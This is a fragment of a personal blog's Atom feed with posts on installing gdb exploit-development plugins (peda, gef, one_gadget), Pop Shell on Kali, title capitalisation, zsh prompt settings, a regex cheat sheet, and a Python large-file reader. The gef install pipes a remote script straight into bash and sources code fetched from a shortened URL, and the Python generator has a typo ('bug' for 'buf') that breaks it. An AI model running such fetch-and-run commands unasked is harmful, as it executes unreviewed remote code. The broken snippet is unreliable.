<pre><code class="language-bash">git clone https://github.com/longld/peda.git ~/peda
echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
echo &quot;DONE! debug your program with gdb and enjoy&quot;
</code></pre>
<h2 id="73-gef">7.3 Gef</h2>
<p>Github Repo Address: <a href="https://github.com/hugsy/gef/">https://github.com/hugsy/gef/</a><br>
Documentation: <a href="https://gef.readthedocs.io/en/master/">https://gef.readthedocs.io/en/master/</a></p>
<pre><code class="language-bash"># via the install script
## using curl
$ bash -c &quot;$(curl -fsSL http://gef.blah.cat/sh)&quot;

## using wget
$ bash -c &quot;$(wget http://gef.blah.cat/sh -O -)&quot;

# or manually
$ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit

# or alternatively from inside gdb directly
$ gdb -q
(gdb) pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-master').read()); gdb.execute('source %s' % g.name)
</code></pre>
<h1 id="8-one_gadget">8. one_gadget</h1>
<p>Github Repo Address: <a href="https://github.com/david942j/one_gadget/">https://github.com/david942j/one_gadget/</a></p>
<pre><code class="language-bash">sudo apt install ruby
sudo gem install one_gadget
</code></pre>
<h1 id="9-libc-tools">9. Libc Tools</h1>
<p>LibcSearcher: <a href="https://github.com/lieanu/LibcSearcher/">https://github.com/lieanu/LibcSearcher/</a><br>
Online-LibcSearcher: <a href="https://github.com/eclipse-yes/Online-LibcSearcher/">https://github.com/eclipse-yes/Online-LibcSearcher/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Using Pop Shell on Kali Linux]]></title>
        <id>https://eclipse-yes.github.io/post/x8OgZ9olC/</id>
        <link href="https://eclipse-yes.github.io/post/x8OgZ9olC/">
        </link>
        <updated>2021-09-14T04:25:37.000Z</updated>
        <summary type="html"><![CDATA[<p>From my perspective, the most impressive tool on Pop!_OS is the POP SHELL. It provides functions like window management and application launcher which are convenient for Linux GUI users. So why not using it on Kali?</p>
]]></summary>
        <content type="html"><![CDATA[<p>From my perspective, the most impressive tool on Pop!_OS is the POP SHELL. It provides functions like window management and application launcher which are convenient for Linux GUI users. So why not using it on Kali?</p>
<!-- more -->
<h1 id="instructions">Instructions</h1>
<ol>
<li>Update packages, install dependencies and clone official repository.</li>
</ol>
<pre><code class="language-bash">sudo apt update
sudo apt install git node-typescript make
git clone https://github.com/pop-os/shell.git
</code></pre>
<ol start="2">
<li>Install pop shell through source code.</li>
</ol>
<pre><code class="language-bash">cd shell
make local-install
</code></pre>
<p>Besides, sometimes it might occur some errors, like <code>Extension: pop-shell@sysem76.com does not exist</code>. The quickest and simplest way to solve it is to reboot machine.</p>
<hr>
<p><strong>Reference:</strong> <a href="https://support.system76.com/articles/pop-shell">https://support.system76.com/articles/pop-shell</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Writing Styles: the Title of English Articles]]></title>
        <id>https://eclipse-yes.github.io/post/z8nT6kBDu/</id>
        <link href="https://eclipse-yes.github.io/post/z8nT6kBDu/">
        </link>
        <updated>2021-09-12T13:54:21.000Z</updated>
        <summary type="html"><![CDATA[<p>For novice writers, sometimes it is hard to be clear how to manage titles. Especially what letter need be capitalised and what letter do not. After reading this blog, I wish you learned more prevalent rules.</p>
]]></summary>
        <content type="html"><![CDATA[<p>For novice writers, sometimes it is hard to be clear how to manage titles. Especially what letter need be capitalised and what letter do not. After reading this blog, I wish you learned more prevalent rules.</p>
<!-- more -->
<h2 id="common-specifications-for-writing-english-articles">Common Specifications for Writing English Articles</h2>
<ul>
<li>Associated Press Stylebook</li>
<li>Chicago Manual of Style</li>
<li>MLA Style</li>
</ul>
<h2 id="genral-rules-of-title-letter-cases">Genral Rules of Title Letter Cases</h2>
<ul>
<li>Always capitalise the first and last word of any title.</li>
<li>Capitalise nouns, pronouns, verbs, adjectives, and adverbs.</li>
<li>Do not capitalise articles, prepositions, or coordinating conjunctions.</li>
</ul>
<h2 id="style-guide-differences">Style guide differences</h2>
<ul>
<li>In the AP Stylebook, all words with three letters or less are lowercased. However, if any of those words are verbs (is, are, was, be), they are to be capitalized.</li>
<li>In the Chicago Manual of Style, all prepositions ae lowercased, even the lengthier ones (between, among, throughout).</li>
<li>In MLA style, words with three letters or less are always lowercased.</li>
</ul>
<h2 id="more-details">More Details</h2>
<p>If you want to get far more details of each style (which is amazing!! 👍), do reseach with search engines like google or bing and leave a comment below to share your own findings with us.</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Permanently Revert to One-line Terminal in New Kali Linux 2021.02]]></title>
        <id>https://eclipse-yes.github.io/post/xJOKBvGro/</id>
        <link href="https://eclipse-yes.github.io/post/xJOKBvGro/">
        </link>
        <updated>2021-09-12T13:39:04.000Z</updated>
        <summary type="html"><![CDATA[<p>After the release of Kali Linux 2021.02 version, I can not help to install it in Parallels Desktop. Nevertheless, the Parallels Tools still cannot be correctly installed in PD 16 on macOS 11.5. Except for some novel features and enhancements, there are some stuff that I am a little confused about -- the Command Line.</p>
]]></summary>
        <content type="html"><![CDATA[<p>After the release of Kali Linux 2021.02 version, I can not help to install it in Parallels Desktop. Nevertheless, the Parallels Tools still cannot be correctly installed in PD 16 on macOS 11.5. Except for some novel features and enhancements, there are some stuff that I am a little confused about -- the Command Line.</p>
<!-- more -->
<blockquote>
<p>As long as editing configuration file though VIM or NeoVIM is acceptable, do it.</p>
</blockquote>
<h1 id="issue-description">Issue Description</h1>
<p>If you are using ZSH on your terminal, then you might notice that PROMPT is different from the previous ones.</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210912212534.png" alt="img" loading="lazy"></figure>
<p>For personal habit, the one line command prompt is much cleaner and better. So, I am wondering how to get back to the old version. Off course, the official blog gives us the answer.</p>
<blockquote>
<p>If you are using ZSH, with the latest Kali profile applied, you can <strong>toggle between the two-line prompt and one-line prompt</strong> by pressing: <strong><code>CTRL</code> + <code>p</code></strong> <em>(at the same time)</em>. This will only have an effect for the <strong>current session</strong>. If you would like to set it <strong>permanently, see <code>kali-tweaks</code></strong>.<br>
From: https://www.kali.org/blog/kali-linux-2021-2-release/#theme-enhancement</p>
</blockquote>
<p>Instead of trying new features like kali-tweaks version 1.0, the smoothest way for me is to edit specific variables or commands to permanently finish this confusion.</p>
<h1 id="solution">Solution</h1>
<p>The first opinion bump into my mind is change the <code>$PS1</code> variable. However,</p>
<figure data-type="image" tabindex="2"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210912213218.png" alt="image-20210912213218206" loading="lazy"></figure>
<p>we can see that this solution is slightly complicated. Anyway, check the <code>.zshrc</code> profile and the solution is clear.</p>
<figure data-type="image" tabindex="3"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210912213518.png" alt="image-20210912213518276" loading="lazy"></figure>
<p>Change variable <code>PROMPT_ALTERNATIVE</code> from twoline into oneline. Then we permanentlt finish our task.</p>
<figure data-type="image" tabindex="4"><img src="https://gitee.com/ec1ipse/pics-storage/raw/master/img/20210912213738.png" alt="image-20210912213738281" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Introduction to Regular Expression]]></title>
        <id>https://eclipse-yes.github.io/post/6qQ0FB8Hw/</id>
        <link href="https://eclipse-yes.github.io/post/6qQ0FB8Hw/">
        </link>
        <updated>2021-09-07T04:53:06.000Z</updated>
        <summary type="html"><![CDATA[<p>正则表达式是由普通字符（例如字符a 到z）以及特殊字符（称为&quot;元字符&quot;）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。 正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
]]></summary>
        <content type="html"><![CDATA[<p>正则表达式是由普通字符（例如字符a 到z）以及特殊字符（称为&quot;元字符&quot;）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。 正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。</p>
<!-- more -->
<h1 id="基本元字符">基本元字符</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">.</td>
<td style="text-align:center">匹配任意单个字符</td>
</tr>
<tr>
<td style="text-align:center">|</td>
<td style="text-align:center">逻辑或操作符</td>
</tr>
<tr>
<td style="text-align:center">[]</td>
<td style="text-align:center">匹配字符集合中的一个字符</td>
</tr>
<tr>
<td style="text-align:center">[^]</td>
<td style="text-align:center">对字符集求非</td>
</tr>
<tr>
<td style="text-align:center">-</td>
<td style="text-align:center">定义一个区间（e.g. [A-Z]）</td>
</tr>
<tr>
<td style="text-align:center">|对下一个字符进行转义</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h1 id="数量元字符">数量元字符</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">*</td>
<td style="text-align:center">匹配前一个字符（子表达式）的零次or多次</td>
</tr>
<tr>
<td style="text-align:center">*?</td>
<td style="text-align:center">*的懒惰版本</td>
</tr>
<tr>
<td style="text-align:center">+</td>
<td style="text-align:center">匹配前一个字符（子表达式）的一次or多次</td>
</tr>
<tr>
<td style="text-align:center">+?</td>
<td style="text-align:center">+的懒惰版本</td>
</tr>
<tr>
<td style="text-align:center">?</td>
<td style="text-align:center">匹配前一个字符（子表达式）的零次or一次</td>
</tr>
<tr>
<td style="text-align:center">{n}</td>
<td style="text-align:center">匹配前一个字符（子表达式）的n次</td>
</tr>
<tr>
<td style="text-align:center">{m, n}</td>
<td style="text-align:center">匹配前一个字符（子表达式）的m-n次</td>
</tr>
<tr>
<td style="text-align:center">{n, }</td>
<td style="text-align:center">匹配前一个字符（子表达式）至少n次</td>
</tr>
<tr>
<td style="text-align:center">{n, }?</td>
<td style="text-align:center">{n, }的懒惰版本</td>
</tr>
</tbody>
</table>
<h1 id="位置元字符">位置元字符</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">^</td>
<td style="text-align:center">匹配字符串的开头</td>
</tr>
<tr>
<td style="text-align:center">\A</td>
<td style="text-align:center">匹配字符串的开头</td>
</tr>
<tr>
<td style="text-align:center">$</td>
<td style="text-align:center">匹配字符串的结束</td>
</tr>
<tr>
<td style="text-align:center">\Z</td>
<td style="text-align:center">匹配字符串的结束</td>
</tr>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">匹配单词的开头</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">匹配单词的结束</td>
</tr>
<tr>
<td style="text-align:center">\b</td>
<td style="text-align:center">匹配单词的边界（开头and结束）</td>
</tr>
<tr>
<td style="text-align:center">\B</td>
<td style="text-align:center">\b的反义</td>
</tr>
</tbody>
</table>
<h1 id="特殊字符元字符">特殊字符元字符</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">[\b]</td>
<td style="text-align:center">退格字符</td>
</tr>
<tr>
<td style="text-align:center">\c</td>
<td style="text-align:center">匹配一个控制字符</td>
</tr>
<tr>
<td style="text-align:center">\d</td>
<td style="text-align:center">匹配任意数字字符</td>
</tr>
<tr>
<td style="text-align:center">\D</td>
<td style="text-align:center">\d的反义</td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td style="text-align:center">换页符</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">换行符</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">回车符</td>
</tr>
<tr>
<td style="text-align:center">\s</td>
<td style="text-align:center">匹配一个空白字符</td>
</tr>
<tr>
<td style="text-align:center">\S</td>
<td style="text-align:center">\s的反义</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">制表符</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td style="text-align:center">垂直制表符</td>
</tr>
<tr>
<td style="text-align:center">\w</td>
<td style="text-align:center">匹配任意字母数字字符or下划线字符</td>
</tr>
<tr>
<td style="text-align:center">\W</td>
<td style="text-align:center">\w的反义</td>
</tr>
<tr>
<td style="text-align:center">\x</td>
<td style="text-align:center">匹配一个十六进制数字</td>
</tr>
<tr>
<td style="text-align:center">\0</td>
<td style="text-align:center">匹配一个八进制数字</td>
</tr>
</tbody>
</table>
<h1 id="回溯引用和前后查找">回溯引用和前后查找</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">()</td>
<td style="text-align:center">定义一个子表达式</td>
</tr>
<tr>
<td style="text-align:center">\1</td>
<td style="text-align:center">匹配第1个子表达式；\n表示匹配第n个子表达式</td>
</tr>
<tr>
<td style="text-align:center">?=</td>
<td style="text-align:center">向前查找</td>
</tr>
<tr>
<td style="text-align:center">?&lt;=</td>
<td style="text-align:center">向后查找</td>
</tr>
<tr>
<td style="text-align:center">?!</td>
<td style="text-align:center">负向前查找</td>
</tr>
<tr>
<td style="text-align:center">?&lt;!</td>
<td style="text-align:center">负向后查找</td>
</tr>
<tr>
<td style="text-align:center">?()</td>
<td style="text-align:center">条件（if then）</td>
</tr>
<tr>
<td style="text-align:center">?()|</td>
<td style="text-align:center">条件（if then... else...）</td>
</tr>
</tbody>
</table>
<h1 id="大小写转换">大小写转换</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">\E</td>
<td style="text-align:center">结束\L or \U转换</td>
</tr>
<tr>
<td style="text-align:center">\l</td>
<td style="text-align:center">把下一个字符转换为小写</td>
</tr>
<tr>
<td style="text-align:center">\L</td>
<td style="text-align:center">把后面的字符转换为小写，直到遇到\E</td>
</tr>
<tr>
<td style="text-align:center">\u</td>
<td style="text-align:center">把下一个字符转换为大写</td>
</tr>
<tr>
<td style="text-align:center">\U</td>
<td style="text-align:center">把后面的字符转换为大写，直到遇到\E</td>
</tr>
</tbody>
</table>
<h1 id="匹配模式">匹配模式</h1>
<table>
<thead>
<tr>
<th style="text-align:center">元字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">(?m)</td>
<td style="text-align:center">分行匹配模式</td>
</tr>
</tbody>
</table>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Deal with Large File in Python]]></title>
        <id>https://eclipse-yes.github.io/post/xEKOnLjpQ/</id>
        <link href="https://eclipse-yes.github.io/post/xEKOnLjpQ/">
        </link>
        <updated>2021-09-05T08:04:37.000Z</updated>
        <summary type="html"><![CDATA[<p>When we use <code>f.readlines()</code> or <code>f.readline()</code> to get file data, there might happen a problem. For example, the file is so large that our computer memory is not big enough to afford.</p>
]]></summary>
        <content type="html"><![CDATA[<p>When we use <code>f.readlines()</code> or <code>f.readline()</code> to get file data, there might happen a problem. For example, the file is so large that our computer memory is not big enough to afford.</p>
<!-- more -->
<p>So, how to deal with large file by Python. Here is the solution: 👇</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-

def file_reader(f, newline):
    &quot;&quot;&quot;
    Parameters:
        - f: io.BufferReader
        - newline: separator
    Description:
        A generator to deal with huge file.
    &quot;&quot;&quot;
    buf = &quot;&quot;
    while True:
        while newline in buf:
            pos = buf.index(newline)
            yield bug[:pos]
            buf = buf[pos + len(newline):]
        chunk = f.read(4096)
        if not chunk:
            yield buf
            break
        buf += chunk
</code></pre>
]]></content>
    </entry>
</feed>